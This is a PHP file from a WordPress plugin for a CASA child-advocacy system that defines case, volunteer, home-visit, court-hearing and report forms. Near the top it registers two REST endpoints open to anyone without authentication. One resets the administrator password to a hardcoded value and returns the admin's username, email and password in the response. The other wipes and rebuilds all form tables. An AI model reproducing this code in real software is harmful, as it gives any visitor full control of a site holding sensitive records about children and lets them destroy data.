<?php
/**
 * CASA Forms and Sample Data Setup
 *
 * Creates proper Formidable Forms with all fields matching the frontend,
 * and adds sample test data for testing.
 */

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Register the setup endpoint
 */
add_action('rest_api_init', function() {
    register_rest_route('casa/v1', '/admin/setup-forms-and-data', array(
        'methods' => 'POST',
        'callback' => 'casa_setup_forms_and_sample_data',
        'permission_callback' => '__return_true' // Allow for initial setup
    ));

    // Temporary endpoint to reset admin password
    register_rest_route('casa/v1', '/admin/reset-wp-admin', array(
        'methods' => 'POST',
        'callback' => 'casa_reset_wp_admin_password',
        'permission_callback' => '__return_true'
    ));
});

/**
 * Reset WordPress admin password (temporary utility)
 */
function casa_reset_wp_admin_password($request) {
    $admin_user = get_user_by('login', 'admin');

    if (!$admin_user) {
        // Try to find any administrator
        $admins = get_users(array('role' => 'administrator', 'number' => 1));
        if (!empty($admins)) {
            $admin_user = $admins[0];
        }
    }

    if (!$admin_user) {
        return new WP_REST_Response(array(
            'success' => false,
            'message' => 'No admin user found'
        ), 404);
    }

    // Reset password to a known value
    $new_password = 'CasaAdmin2024!';
    wp_set_password($new_password, $admin_user->ID);

    return new WP_REST_Response(array(
        'success' => true,
        'message' => 'Admin password reset',
        'username' => $admin_user->user_login,
        'email' => $admin_user->user_email,
        'password' => $new_password
    ), 200);
}

/**
 * Main setup function
 */
function casa_setup_forms_and_sample_data($request) {
    global $wpdb;

    $results = array(
        'forms_created' => array(),
        'sample_data' => array(),
        'errors' => array()
    );

    // Step 1: Create all Formidable Forms with proper fields
    $forms_result = casa_create_formidable_forms();
    $results['forms_created'] = $forms_result;

    // Step 2: Add sample data
    $data_result = casa_add_sample_data();
    $results['sample_data'] = $data_result;

    return new WP_REST_Response(array(
        'success' => true,
        'message' => 'Forms and sample data setup complete',
        'data' => $results
    ), 200);
}

/**
 * Create all Formidable Forms with proper field mappings
 */
function casa_create_formidable_forms() {
    global $wpdb;

    $forms_table = $wpdb->prefix . 'frm_forms';
    $fields_table = $wpdb->prefix . 'frm_fields';
    $items_table = $wpdb->prefix . 'frm_items';
    $item_metas_table = $wpdb->prefix . 'frm_item_metas';

    $results = array();

    // Create Formidable Forms tables if they don't exist
    $charset_collate = $wpdb->get_charset_collate();

    // Check if frm_forms table exists, create if not
    if ($wpdb->get_var("SHOW TABLES LIKE '$forms_table'") != $forms_table) {
        $sql = "CREATE TABLE $forms_table (
            id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
            form_key varchar(100) DEFAULT NULL,
            name varchar(255) DEFAULT NULL,
            description text,
            status varchar(20) DEFAULT 'published',
            parent_form_id bigint(20) unsigned DEFAULT 0,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY form_key (form_key)
        ) $charset_collate;";
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        $results[] = 'Created frm_forms table';
    }

    // Check if frm_fields table exists, create if not
    if ($wpdb->get_var("SHOW TABLES LIKE '$fields_table'") != $fields_table) {
        $sql = "CREATE TABLE $fields_table (
            id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
            field_key varchar(100) DEFAULT NULL,
            name varchar(255) DEFAULT NULL,
            description text,
            type varchar(50) DEFAULT 'text',
            required tinyint(1) DEFAULT 0,
            field_order int DEFAULT 0,
            form_id bigint(20) unsigned DEFAULT NULL,
            options text,
            default_value text,
            field_options longtext,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY field_key (field_key),
            KEY form_id (form_id)
        ) $charset_collate;";
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        $results[] = 'Created frm_fields table';
    }

    // Check if frm_items (entries) table exists, create if not
    if ($wpdb->get_var("SHOW TABLES LIKE '$items_table'") != $items_table) {
        $sql = "CREATE TABLE $items_table (
            id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
            item_key varchar(100) DEFAULT NULL,
            name text,
            description text,
            ip varchar(100) DEFAULT NULL,
            form_id bigint(20) unsigned DEFAULT NULL,
            post_id bigint(20) unsigned DEFAULT 0,
            user_id bigint(20) unsigned DEFAULT 0,
            parent_item_id bigint(20) unsigned DEFAULT 0,
            is_draft tinyint(1) DEFAULT 0,
            updated_by bigint(20) unsigned DEFAULT NULL,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            updated_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY item_key (item_key),
            KEY form_id (form_id),
            KEY user_id (user_id)
        ) $charset_collate;";
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        $results[] = 'Created frm_items table';
    }

    // Check if frm_item_metas table exists, create if not
    if ($wpdb->get_var("SHOW TABLES LIKE '$item_metas_table'") != $item_metas_table) {
        $sql = "CREATE TABLE $item_metas_table (
            id bigint(20) unsigned NOT NULL AUTO_INCREMENT,
            meta_value longtext,
            field_id bigint(20) unsigned NOT NULL,
            item_id bigint(20) unsigned NOT NULL,
            created_at datetime DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (id),
            KEY field_id (field_id),
            KEY item_id (item_id)
        ) $charset_collate;";
        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        $results[] = 'Created frm_item_metas table';
    }

    // Clear existing forms and fields for clean setup using DELETE (safer than TRUNCATE)
    $wpdb->query("DELETE FROM $item_metas_table");
    $wpdb->query("DELETE FROM $items_table");
    $wpdb->query("DELETE FROM $fields_table");
    $wpdb->query("DELETE FROM $forms_table");

    // Reset auto increment
    $wpdb->query("ALTER TABLE $forms_table AUTO_INCREMENT = 1");
    $wpdb->query("ALTER TABLE $fields_table AUTO_INCREMENT = 1");
    $wpdb->query("ALTER TABLE $items_table AUTO_INCREMENT = 1");
    $wpdb->query("ALTER TABLE $item_metas_table AUTO_INCREMENT = 1");

    $now = current_time('mysql');

    // ========================================
    // FORM 1: Case Intake Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 1,
        'form_key' => 'case_intake',
        'name' => 'Case Intake Form',
        'description' => 'Form for new case intake with child and case information',
        'status' => 'published',
        'created_at' => $now
    ));

    $case_intake_fields = array(
        // Child Information
        array('id' => 1, 'field_key' => 'child_first_name', 'name' => 'Child First Name', 'type' => 'text', 'required' => 1, 'field_order' => 1),
        array('id' => 2, 'field_key' => 'child_last_name', 'name' => 'Child Last Name', 'type' => 'text', 'required' => 1, 'field_order' => 2),
        array('id' => 3, 'field_key' => 'child_dob', 'name' => 'Child Date of Birth', 'type' => 'date', 'required' => 1, 'field_order' => 3),
        array('id' => 4, 'field_key' => 'child_gender', 'name' => 'Child Gender', 'type' => 'select', 'required' => 0, 'field_order' => 4, 'options' => 'Male,Female,Non-Binary,Other'),
        array('id' => 5, 'field_key' => 'child_ethnicity', 'name' => 'Child Ethnicity', 'type' => 'text', 'required' => 0, 'field_order' => 5),
        // Case Details
        array('id' => 6, 'field_key' => 'case_number', 'name' => 'Case Number', 'type' => 'text', 'required' => 1, 'field_order' => 6),
        array('id' => 7, 'field_key' => 'case_type', 'name' => 'Case Type', 'type' => 'select', 'required' => 1, 'field_order' => 7, 'options' => 'Dependency,Delinquency,Termination of Parental Rights,Guardianship,Other'),
        array('id' => 8, 'field_key' => 'case_priority', 'name' => 'Case Priority', 'type' => 'select', 'required' => 0, 'field_order' => 8, 'options' => 'Low,Medium,High,Urgent'),
        array('id' => 9, 'field_key' => 'case_status', 'name' => 'Case Status', 'type' => 'select', 'required' => 1, 'field_order' => 9, 'options' => 'Active,Pending,Closed,On Hold'),
        array('id' => 10, 'field_key' => 'referral_date', 'name' => 'Referral Date', 'type' => 'date', 'required' => 0, 'field_order' => 10),
        array('id' => 11, 'field_key' => 'case_summary', 'name' => 'Case Summary', 'type' => 'textarea', 'required' => 0, 'field_order' => 11),
        // Court Information
        array('id' => 12, 'field_key' => 'court_jurisdiction', 'name' => 'Court Jurisdiction', 'type' => 'select', 'required' => 0, 'field_order' => 12, 'options' => 'Family Court,Juvenile Court,District Court,Other'),
        array('id' => 13, 'field_key' => 'assigned_judge', 'name' => 'Assigned Judge', 'type' => 'text', 'required' => 0, 'field_order' => 13),
        array('id' => 14, 'field_key' => 'courtroom', 'name' => 'Courtroom', 'type' => 'text', 'required' => 0, 'field_order' => 14),
        // Placement Information
        array('id' => 15, 'field_key' => 'current_placement', 'name' => 'Current Placement', 'type' => 'select', 'required' => 0, 'field_order' => 15, 'options' => 'Foster Home,Relative Placement,Group Home,Residential,Other'),
        array('id' => 16, 'field_key' => 'placement_date', 'name' => 'Placement Date', 'type' => 'date', 'required' => 0, 'field_order' => 16),
        array('id' => 17, 'field_key' => 'placement_address', 'name' => 'Placement Address', 'type' => 'textarea', 'required' => 0, 'field_order' => 17),
        array('id' => 18, 'field_key' => 'placement_contact', 'name' => 'Placement Contact Person', 'type' => 'text', 'required' => 0, 'field_order' => 18),
        array('id' => 19, 'field_key' => 'placement_phone', 'name' => 'Placement Phone', 'type' => 'phone', 'required' => 0, 'field_order' => 19),
        // Volunteer Assignment
        array('id' => 20, 'field_key' => 'assigned_volunteer_id', 'name' => 'Assigned Volunteer ID', 'type' => 'number', 'required' => 0, 'field_order' => 20),
        array('id' => 21, 'field_key' => 'assignment_date', 'name' => 'Assignment Date', 'type' => 'date', 'required' => 0, 'field_order' => 21),
        // Goals
        array('id' => 22, 'field_key' => 'case_goals', 'name' => 'Case Goals', 'type' => 'textarea', 'required' => 0, 'field_order' => 22),
        // Meta
        array('id' => 23, 'field_key' => 'organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 23),
    );

    foreach ($case_intake_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 1,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 1: Case Intake with 23 fields';

    // ========================================
    // FORM 2: Volunteer Registration Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 2,
        'form_key' => 'volunteer_registration',
        'name' => 'Volunteer Registration Form',
        'description' => 'Complete volunteer registration and application form',
        'status' => 'published',
        'created_at' => $now
    ));

    $volunteer_fields = array(
        // Personal Information
        array('id' => 30, 'field_key' => 'vol_first_name', 'name' => 'First Name', 'type' => 'text', 'required' => 1, 'field_order' => 1),
        array('id' => 31, 'field_key' => 'vol_last_name', 'name' => 'Last Name', 'type' => 'text', 'required' => 1, 'field_order' => 2),
        array('id' => 32, 'field_key' => 'vol_email', 'name' => 'Email', 'type' => 'email', 'required' => 1, 'field_order' => 3),
        array('id' => 33, 'field_key' => 'vol_phone', 'name' => 'Phone', 'type' => 'phone', 'required' => 1, 'field_order' => 4),
        array('id' => 34, 'field_key' => 'vol_dob', 'name' => 'Date of Birth', 'type' => 'date', 'required' => 1, 'field_order' => 5),
        array('id' => 35, 'field_key' => 'vol_address', 'name' => 'Street Address', 'type' => 'text', 'required' => 1, 'field_order' => 6),
        array('id' => 36, 'field_key' => 'vol_city', 'name' => 'City', 'type' => 'text', 'required' => 1, 'field_order' => 7),
        array('id' => 37, 'field_key' => 'vol_state', 'name' => 'State', 'type' => 'text', 'required' => 1, 'field_order' => 8),
        array('id' => 38, 'field_key' => 'vol_zip', 'name' => 'ZIP Code', 'type' => 'text', 'required' => 1, 'field_order' => 9),
        // Emergency Contact
        array('id' => 39, 'field_key' => 'emergency_name', 'name' => 'Emergency Contact Name', 'type' => 'text', 'required' => 1, 'field_order' => 10),
        array('id' => 40, 'field_key' => 'emergency_phone', 'name' => 'Emergency Contact Phone', 'type' => 'phone', 'required' => 1, 'field_order' => 11),
        array('id' => 41, 'field_key' => 'emergency_relationship', 'name' => 'Emergency Contact Relationship', 'type' => 'text', 'required' => 1, 'field_order' => 12),
        // Background
        array('id' => 42, 'field_key' => 'employer', 'name' => 'Employer', 'type' => 'text', 'required' => 0, 'field_order' => 13),
        array('id' => 43, 'field_key' => 'occupation', 'name' => 'Occupation', 'type' => 'text', 'required' => 0, 'field_order' => 14),
        array('id' => 44, 'field_key' => 'education_level', 'name' => 'Education Level', 'type' => 'select', 'required' => 0, 'field_order' => 15, 'options' => 'High School,Some College,Associates,Bachelors,Masters,Doctorate'),
        array('id' => 45, 'field_key' => 'languages', 'name' => 'Languages Spoken', 'type' => 'text', 'required' => 0, 'field_order' => 16),
        array('id' => 46, 'field_key' => 'volunteer_experience', 'name' => 'Previous Volunteer Experience', 'type' => 'textarea', 'required' => 0, 'field_order' => 17),
        // Availability
        array('id' => 47, 'field_key' => 'preferred_schedule', 'name' => 'Preferred Schedule', 'type' => 'text', 'required' => 0, 'field_order' => 18),
        array('id' => 48, 'field_key' => 'max_cases', 'name' => 'Maximum Cases', 'type' => 'number', 'required' => 1, 'field_order' => 19),
        array('id' => 49, 'field_key' => 'availability_notes', 'name' => 'Availability Notes', 'type' => 'textarea', 'required' => 0, 'field_order' => 20),
        // References
        array('id' => 50, 'field_key' => 'ref1_name', 'name' => 'Reference 1 Name', 'type' => 'text', 'required' => 1, 'field_order' => 21),
        array('id' => 51, 'field_key' => 'ref1_phone', 'name' => 'Reference 1 Phone', 'type' => 'phone', 'required' => 1, 'field_order' => 22),
        array('id' => 52, 'field_key' => 'ref1_relationship', 'name' => 'Reference 1 Relationship', 'type' => 'text', 'required' => 1, 'field_order' => 23),
        array('id' => 53, 'field_key' => 'ref2_name', 'name' => 'Reference 2 Name', 'type' => 'text', 'required' => 1, 'field_order' => 24),
        array('id' => 54, 'field_key' => 'ref2_phone', 'name' => 'Reference 2 Phone', 'type' => 'phone', 'required' => 1, 'field_order' => 25),
        array('id' => 55, 'field_key' => 'ref2_relationship', 'name' => 'Reference 2 Relationship', 'type' => 'text', 'required' => 1, 'field_order' => 26),
        // Preferences
        array('id' => 56, 'field_key' => 'age_preference', 'name' => 'Age Preference', 'type' => 'text', 'required' => 0, 'field_order' => 27),
        array('id' => 57, 'field_key' => 'special_needs_exp', 'name' => 'Special Needs Experience', 'type' => 'checkbox', 'required' => 0, 'field_order' => 28),
        array('id' => 58, 'field_key' => 'transportation', 'name' => 'Transportation Available', 'type' => 'checkbox', 'required' => 0, 'field_order' => 29),
        // Agreements
        array('id' => 59, 'field_key' => 'background_check_consent', 'name' => 'Background Check Consent', 'type' => 'checkbox', 'required' => 1, 'field_order' => 30),
        array('id' => 60, 'field_key' => 'liability_waiver', 'name' => 'Liability Waiver', 'type' => 'checkbox', 'required' => 1, 'field_order' => 31),
        array('id' => 61, 'field_key' => 'confidentiality_agreement', 'name' => 'Confidentiality Agreement', 'type' => 'checkbox', 'required' => 1, 'field_order' => 32),
        // Meta
        array('id' => 62, 'field_key' => 'vol_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 33),
    );

    foreach ($volunteer_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 2,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 2: Volunteer Registration with 33 fields';

    // ========================================
    // FORM 3: Contact Log Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 3,
        'form_key' => 'contact_log',
        'name' => 'Contact Log Form',
        'description' => 'Log contacts and interactions for cases',
        'status' => 'published',
        'created_at' => $now
    ));

    $contact_log_fields = array(
        array('id' => 70, 'field_key' => 'contact_case_id', 'name' => 'Case ID', 'type' => 'number', 'required' => 1, 'field_order' => 1),
        array('id' => 71, 'field_key' => 'contact_type', 'name' => 'Contact Type', 'type' => 'select', 'required' => 1, 'field_order' => 2, 'options' => 'Phone Call,In-Person Visit,Email,Video Call,Text Message,Other'),
        array('id' => 72, 'field_key' => 'contact_date', 'name' => 'Contact Date', 'type' => 'date', 'required' => 1, 'field_order' => 3),
        array('id' => 73, 'field_key' => 'contact_time', 'name' => 'Contact Time', 'type' => 'time', 'required' => 0, 'field_order' => 4),
        array('id' => 74, 'field_key' => 'duration_minutes', 'name' => 'Duration (minutes)', 'type' => 'number', 'required' => 0, 'field_order' => 5),
        array('id' => 75, 'field_key' => 'contact_location', 'name' => 'Location', 'type' => 'text', 'required' => 0, 'field_order' => 6),
        array('id' => 76, 'field_key' => 'participants', 'name' => 'Participants', 'type' => 'text', 'required' => 0, 'field_order' => 7),
        array('id' => 77, 'field_key' => 'purpose', 'name' => 'Purpose', 'type' => 'text', 'required' => 0, 'field_order' => 8),
        array('id' => 78, 'field_key' => 'summary', 'name' => 'Summary', 'type' => 'textarea', 'required' => 1, 'field_order' => 9),
        array('id' => 79, 'field_key' => 'observations', 'name' => 'Observations', 'type' => 'textarea', 'required' => 0, 'field_order' => 10),
        array('id' => 80, 'field_key' => 'concerns', 'name' => 'Concerns', 'type' => 'textarea', 'required' => 0, 'field_order' => 11),
        array('id' => 81, 'field_key' => 'follow_up_required', 'name' => 'Follow-up Required', 'type' => 'checkbox', 'required' => 0, 'field_order' => 12),
        array('id' => 82, 'field_key' => 'follow_up_notes', 'name' => 'Follow-up Notes', 'type' => 'textarea', 'required' => 0, 'field_order' => 13),
        array('id' => 83, 'field_key' => 'next_contact_date', 'name' => 'Next Contact Date', 'type' => 'date', 'required' => 0, 'field_order' => 14),
        array('id' => 84, 'field_key' => 'mileage', 'name' => 'Mileage', 'type' => 'number', 'required' => 0, 'field_order' => 15),
        array('id' => 85, 'field_key' => 'expenses', 'name' => 'Expenses', 'type' => 'number', 'required' => 0, 'field_order' => 16),
        array('id' => 86, 'field_key' => 'contact_volunteer_id', 'name' => 'Volunteer ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 17),
        array('id' => 87, 'field_key' => 'contact_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 18),
    );

    foreach ($contact_log_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 3,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 3: Contact Log with 18 fields';

    // ========================================
    // FORM 4: Home Visit Report Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 4,
        'form_key' => 'home_visit_report',
        'name' => 'Home Visit Report Form',
        'description' => 'Comprehensive home visit documentation',
        'status' => 'published',
        'created_at' => $now
    ));

    $home_visit_fields = array(
        array('id' => 90, 'field_key' => 'visit_case_id', 'name' => 'Case ID', 'type' => 'number', 'required' => 1, 'field_order' => 1),
        array('id' => 91, 'field_key' => 'visit_volunteer_id', 'name' => 'Volunteer ID', 'type' => 'number', 'required' => 1, 'field_order' => 2),
        array('id' => 92, 'field_key' => 'visit_date', 'name' => 'Visit Date', 'type' => 'date', 'required' => 1, 'field_order' => 3),
        array('id' => 93, 'field_key' => 'visit_duration', 'name' => 'Visit Duration (hours)', 'type' => 'number', 'required' => 1, 'field_order' => 4),
        array('id' => 94, 'field_key' => 'visit_location', 'name' => 'Location', 'type' => 'text', 'required' => 1, 'field_order' => 5),
        array('id' => 95, 'field_key' => 'visit_attendees', 'name' => 'Attendees', 'type' => 'text', 'required' => 1, 'field_order' => 6),
        array('id' => 96, 'field_key' => 'visit_observations', 'name' => 'Observations', 'type' => 'textarea', 'required' => 1, 'field_order' => 7),
        array('id' => 97, 'field_key' => 'child_wellbeing', 'name' => 'Child Wellbeing Assessment', 'type' => 'textarea', 'required' => 1, 'field_order' => 8),
        array('id' => 98, 'field_key' => 'placement_stability', 'name' => 'Placement Stability Assessment', 'type' => 'textarea', 'required' => 1, 'field_order' => 9),
        array('id' => 99, 'field_key' => 'safety_concerns', 'name' => 'Safety Concerns', 'type' => 'textarea', 'required' => 1, 'field_order' => 10),
        array('id' => 100, 'field_key' => 'educational_progress', 'name' => 'Educational Progress', 'type' => 'textarea', 'required' => 0, 'field_order' => 11),
        array('id' => 101, 'field_key' => 'social_development', 'name' => 'Social Development', 'type' => 'textarea', 'required' => 0, 'field_order' => 12),
        array('id' => 102, 'field_key' => 'emotional_wellbeing', 'name' => 'Emotional Wellbeing', 'type' => 'textarea', 'required' => 0, 'field_order' => 13),
        array('id' => 103, 'field_key' => 'physical_health', 'name' => 'Physical Health', 'type' => 'textarea', 'required' => 0, 'field_order' => 14),
        array('id' => 104, 'field_key' => 'visit_recommendations', 'name' => 'Recommendations', 'type' => 'textarea', 'required' => 1, 'field_order' => 15),
        array('id' => 105, 'field_key' => 'visit_follow_up', 'name' => 'Follow-up Required', 'type' => 'checkbox', 'required' => 1, 'field_order' => 16),
        array('id' => 106, 'field_key' => 'visit_follow_up_notes', 'name' => 'Follow-up Notes', 'type' => 'textarea', 'required' => 0, 'field_order' => 17),
        array('id' => 107, 'field_key' => 'visit_status', 'name' => 'Report Status', 'type' => 'select', 'required' => 1, 'field_order' => 18, 'options' => 'Draft,Submitted,Approved,Needs Review'),
        array('id' => 108, 'field_key' => 'visit_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 19),
    );

    foreach ($home_visit_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 4,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 4: Home Visit Report with 19 fields';

    // ========================================
    // FORM 5: Document Upload Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 5,
        'form_key' => 'document_upload',
        'name' => 'Document Upload Form',
        'description' => 'Form for uploading case documents',
        'status' => 'published',
        'created_at' => $now
    ));

    $document_fields = array(
        array('id' => 110, 'field_key' => 'doc_case_id', 'name' => 'Case ID', 'type' => 'number', 'required' => 1, 'field_order' => 1),
        array('id' => 111, 'field_key' => 'doc_type', 'name' => 'Document Type', 'type' => 'select', 'required' => 1, 'field_order' => 2, 'options' => 'Court Order,Medical Record,School Record,Assessment,Photo,Legal Document,Correspondence,Other'),
        array('id' => 112, 'field_key' => 'doc_name', 'name' => 'Document Name', 'type' => 'text', 'required' => 1, 'field_order' => 3),
        array('id' => 113, 'field_key' => 'doc_description', 'name' => 'Description', 'type' => 'textarea', 'required' => 0, 'field_order' => 4),
        array('id' => 114, 'field_key' => 'doc_confidential', 'name' => 'Confidential', 'type' => 'checkbox', 'required' => 0, 'field_order' => 5),
        array('id' => 115, 'field_key' => 'doc_file', 'name' => 'File Upload', 'type' => 'file', 'required' => 1, 'field_order' => 6),
        array('id' => 116, 'field_key' => 'doc_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 7),
    );

    foreach ($document_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 5,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 5: Document Upload with 7 fields';

    // ========================================
    // FORM 6: Tasks Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 6,
        'form_key' => 'tasks',
        'name' => 'Tasks Form',
        'description' => 'Form for creating and managing tasks',
        'status' => 'published',
        'created_at' => $now
    ));

    $task_fields = array(
        array('id' => 120, 'field_key' => 'task_title', 'name' => 'Task Title', 'type' => 'text', 'required' => 1, 'field_order' => 1),
        array('id' => 121, 'field_key' => 'task_description', 'name' => 'Description', 'type' => 'textarea', 'required' => 0, 'field_order' => 2),
        array('id' => 122, 'field_key' => 'task_due_date', 'name' => 'Due Date', 'type' => 'date', 'required' => 1, 'field_order' => 3),
        array('id' => 123, 'field_key' => 'task_due_time', 'name' => 'Due Time', 'type' => 'time', 'required' => 0, 'field_order' => 4),
        array('id' => 124, 'field_key' => 'task_priority', 'name' => 'Priority', 'type' => 'select', 'required' => 1, 'field_order' => 5, 'options' => 'Low,Medium,High'),
        array('id' => 125, 'field_key' => 'task_status', 'name' => 'Status', 'type' => 'select', 'required' => 1, 'field_order' => 6, 'options' => 'Pending,In Progress,Completed'),
        array('id' => 126, 'field_key' => 'task_case_id', 'name' => 'Related Case ID', 'type' => 'number', 'required' => 0, 'field_order' => 7),
        array('id' => 127, 'field_key' => 'task_assigned_to', 'name' => 'Assigned To (User ID)', 'type' => 'number', 'required' => 0, 'field_order' => 8),
        array('id' => 128, 'field_key' => 'task_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 9),
    );

    foreach ($task_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 6,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 6: Tasks with 9 fields';

    // ========================================
    // FORM 7: Court Hearings Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 7,
        'form_key' => 'court_hearings',
        'name' => 'Court Hearings Form',
        'description' => 'Form for scheduling and tracking court hearings',
        'status' => 'published',
        'created_at' => $now
    ));

    $hearing_fields = array(
        array('id' => 130, 'field_key' => 'hearing_case_number', 'name' => 'Case Number', 'type' => 'text', 'required' => 1, 'field_order' => 1),
        array('id' => 131, 'field_key' => 'hearing_child_name', 'name' => 'Child Name', 'type' => 'text', 'required' => 1, 'field_order' => 2),
        array('id' => 132, 'field_key' => 'hearing_date', 'name' => 'Hearing Date', 'type' => 'date', 'required' => 1, 'field_order' => 3),
        array('id' => 133, 'field_key' => 'hearing_time', 'name' => 'Hearing Time', 'type' => 'time', 'required' => 0, 'field_order' => 4),
        array('id' => 134, 'field_key' => 'hearing_type', 'name' => 'Hearing Type', 'type' => 'select', 'required' => 1, 'field_order' => 5, 'options' => 'Review,Permanency,Disposition,Termination,Other'),
        array('id' => 135, 'field_key' => 'hearing_court_room', 'name' => 'Court Room', 'type' => 'text', 'required' => 0, 'field_order' => 6),
        array('id' => 136, 'field_key' => 'hearing_judge_name', 'name' => 'Judge Name', 'type' => 'text', 'required' => 0, 'field_order' => 7),
        array('id' => 137, 'field_key' => 'hearing_status', 'name' => 'Status', 'type' => 'select', 'required' => 1, 'field_order' => 8, 'options' => 'Scheduled,Completed,Continued,Cancelled'),
        array('id' => 138, 'field_key' => 'hearing_volunteer_assigned', 'name' => 'CASA Volunteer Assigned', 'type' => 'text', 'required' => 0, 'field_order' => 9),
        array('id' => 139, 'field_key' => 'hearing_notes', 'name' => 'Notes', 'type' => 'textarea', 'required' => 0, 'field_order' => 10),
        array('id' => 140, 'field_key' => 'hearing_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 11),
    );

    foreach ($hearing_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 7,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 7: Court Hearings with 11 fields';

    // ========================================
    // FORM 8: Reports Form
    // ========================================
    $wpdb->insert($forms_table, array(
        'id' => 8,
        'form_key' => 'reports',
        'name' => 'Reports Form',
        'description' => 'Form for CASA reports',
        'status' => 'published',
        'created_at' => $now
    ));

    $report_fields = array(
        array('id' => 150, 'field_key' => 'report_case_id', 'name' => 'Case ID', 'type' => 'number', 'required' => 1, 'field_order' => 1),
        array('id' => 151, 'field_key' => 'report_type', 'name' => 'Report Type', 'type' => 'select', 'required' => 1, 'field_order' => 2, 'options' => 'Court Report,Home Visit,Monthly Summary,Quarterly Review,Initial Assessment,Final Report'),
        array('id' => 152, 'field_key' => 'report_title', 'name' => 'Report Title', 'type' => 'text', 'required' => 1, 'field_order' => 3),
        array('id' => 153, 'field_key' => 'report_date', 'name' => 'Report Date', 'type' => 'date', 'required' => 1, 'field_order' => 4),
        array('id' => 154, 'field_key' => 'report_content', 'name' => 'Report Content', 'type' => 'textarea', 'required' => 1, 'field_order' => 5),
        array('id' => 155, 'field_key' => 'report_recommendations', 'name' => 'Recommendations', 'type' => 'textarea', 'required' => 0, 'field_order' => 6),
        array('id' => 156, 'field_key' => 'report_status', 'name' => 'Status', 'type' => 'select', 'required' => 1, 'field_order' => 7, 'options' => 'Draft,Submitted,Approved,Needs Revision'),
        array('id' => 157, 'field_key' => 'report_volunteer_id', 'name' => 'Volunteer ID', 'type' => 'number', 'required' => 1, 'field_order' => 8),
        array('id' => 158, 'field_key' => 'report_organization_id', 'name' => 'Organization ID', 'type' => 'hidden', 'required' => 1, 'field_order' => 9),
    );

    foreach ($report_fields as $field) {
        $wpdb->insert($fields_table, array(
            'id' => $field['id'],
            'field_key' => $field['field_key'],
            'name' => $field['name'],
            'type' => $field['type'],
            'required' => $field['required'],
            'field_order' => $field['field_order'],
            'form_id' => 8,
            'options' => isset($field['options']) ? $field['options'] : null,
            'created_at' => $now
        ));
    }
    $results[] = 'Created Form 8: Reports with 9 fields';

    return $results;
}

/**
 * Add sample data through Formidable Forms entries
 * This creates entries in frm_items and frm_item_metas tables,
 * and also syncs to CASA custom tables
 */
